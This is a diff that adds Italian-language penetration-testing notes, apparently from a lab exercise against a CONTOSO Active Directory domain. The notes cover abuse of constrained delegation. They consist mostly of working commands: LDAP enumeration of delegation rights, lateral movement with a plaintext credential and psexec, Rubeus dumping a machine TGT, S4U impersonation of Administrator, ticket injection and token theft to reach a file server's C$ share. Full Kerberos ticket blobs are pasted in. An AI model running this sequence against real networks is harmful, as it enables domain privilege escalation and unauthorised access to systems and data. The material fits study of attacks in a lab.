@@ -1071,5 +1071,51 @@ run klist
 vedo se posso accedere al dc
 ls \\lon-dc-1\c$
 ##########################################
+#spiegazione constrain
+S4U2self → Ti scrivi da solo una "delegation letter" dicendo: "Io sono Mario Rossi" e il KDC ti crede (se hai il permesso).
+S4U2proxy → Con quella lettera vai alla reception di un altro edificio e dici: "Ecco la prova che sono Mario Rossi, fammi entrare."
+
+#Enumerazione Constrained Delegation
+ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+
+#questo sotto significa che lon-ws-1 può delegare verso CIFS su lon-fs-1
+sAMAccountName: LON-WS-1$
+msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
+
+#rubeus
+Rubeus.exe s4u /user:<computer$> /msdsspn:<servizio_target> /ticket:<TGT_computer> /impersonateuser:<utente>
+
+#rubeus senzaa protocol transition
+Rubeus.exe s4u /user:<computer$> /msdsspn:<servizio_target> /ticket:<TGT_computer> /tgs:<ticket_utente>
+
+##########################################
+#Cerco computer che hanno alowtodelegateto
+ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+
+#ottenere UAC per lon-ws-1
+ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
+# capisci se su quella macchina puoi fare attacco Constrained Delegation + Protocol Transition (S4U2self + S4U2proxy) o se sei limitato
+[Convert]::ToBoolean(16781312 -band 16777216)
+
+#lateral movement sulla vm
+make_token CONTOSO\rsteel Passw0rd!
+jump psexec64 lon-ws-1 smb
+
+#Dump del TGT da lon-ws
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
+
+#eseguire S4U
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5H9GGfzOEvDFG7N8lw8nH6Nz8DjurKxl5L9yNbBq6Da6owxXqhtYjWvtvpedV1RNuPFAWFsyyTuc1GxRTCal3yn3gYAB578+I566+yAPo86elKenXda6UG4IBAEtJq8ZZUEX+9hIVqTeyChyQU65xmiFJzEK3CBu77qFQ1+h2rG8MnF63RQDGLafoFYLBQYtiva10KwvQo/m+2qnlf4gV9F0GKvTE8hJ33WuhWC58YAfOMzLdRY9N249PSJUx1DE9pjSKq/yId1gMVbTs6EBDMLpsiRRd66V3Tg7fjsnruHvAFFbtyLhJupmEd0qNfMGubH7i4kbwaSb4OvUFOebPdUNJz661ovAWvWMImVciJLiSl/DUP4EgapBCaWhzZmtKVBInvmhwnKTXh+/0v7B8dtPqaJO9/uN1D9u3kpk4N/P76gq5PF8ADjQ97Ef2631hdlJWsipJOZLwWAcbQW9NyrkBMKjoSxv2mOq9qa7bE/KACCwPbH+GscAW/t++a5wUC6DT6FW2oCPXBQRGVuXcQnpLFts3Kbz73gRHL76z+eBSY9++UDYTN9M687RzRTd6a+AtsVeBQDwvksomMfdvMMVpruRU+kPKxZz60UR355cP/RqSyCmwP80l/oogg8lU3znX1NV4IonkkBn9c66Z8FZc2vlo+i46wAdwkKlMaz2Y0z127+ieGenZD0F9OaG6EJ/DV3CG+0NjBMw7H6tkfCdRA3BjMjcAEcVd39Blbia4Sz28R8Ftfuf7F1GKTSNHFag7L+RKcLeGi4ClyULZ9W0JzTLWGfUf1r3jVC9tD9JOM+5AwKCfD5ZmR5BzRIRc+5qyvTw6mg9ARaUv6VWcwwYQwkS/Seg5wHh5NQOG9VwjLVugWG2OIr0jfqDlYiqencCrGjCnZBb3g3L5yAbU4395xEcvt4eUW4rnUnMkZz2TAsrOOYKeM9wmkgzNrBJv7CWxApnt4kjKWiN+e+P50f5Fr2sy2RBMo+ZSncIyaFd8JZseHIQnxQk5rmMdsx6br1v8+Zx1c5LDPn4jDbmTe9MCkIfS9UZJNQoAjNL9Sei5kYOtelmjeZv1o9bXj0QTuesZS1B59u9eX9gKuY3g9QUGF7PRAqHvN8l3ufgodEwmEdjlRygD9M2sVTOLIWM+amTCznskQWCeQSfmofC6G57FajDFkmq12p6JELWRsvjAZZh8b6awG+N83H+Eet+V2jsdj5iMGKM5Ef3DC0hkEX5gqJzVjvnYAswJVfV4rp5t7EHqMtL9nGQkT+kc3RLQ2Qw6iGM9ZAt9QbDeNmZFelfXLN1p2xS/yaYEFrS/hqCha0TfHHr6ftnYvIhxe9QSMMRz92yQKc4q36qK/G/n5LY2Gcau2ooHIJ5NgqaiGL4hzyVc6XxP6duuqwMPuwdLnjqcThmfG5N+k7+oQjB1k5o7qEJFcbmt0KOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEELH/xc0GkWESaugUiNjMQdWhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTA4MTIxNjAwNDVaphEYDzIwMjUwODEzMDE1MjMwWqcRGA8yMDI1MDgxOTE1NTIzMFqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N /impersonateuser:Administrator /nowrap
+
+#injecto il ticket dentro il logon session
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
+
+#prendo il token
+steal_token 3996
+#guardo se ci sta il ticket
+run klist
+#checkop se funziona
+ls \\lon-fs-1\c$
+##########################################
 
 ```
